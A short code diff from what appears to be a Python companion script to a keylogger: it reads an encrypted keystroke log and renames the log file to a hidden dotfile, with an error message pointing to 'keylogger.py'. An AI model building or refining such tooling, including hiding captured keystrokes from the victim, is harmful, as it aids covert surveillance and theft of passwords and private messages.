@@ -16,7 +16,7 @@ except FileNotFoundError:
 
 # === Step 2: Read the encrypted log file ===
 try:
-    with open("keylog.txt", "rb") as log_file:
+    with open(".keylog.txt", "rb") as log_file:
         lines = log_file.readlines()
 except FileNotFoundError:
     print("❌ keylog.txt not found. Run keylogger.py first.")
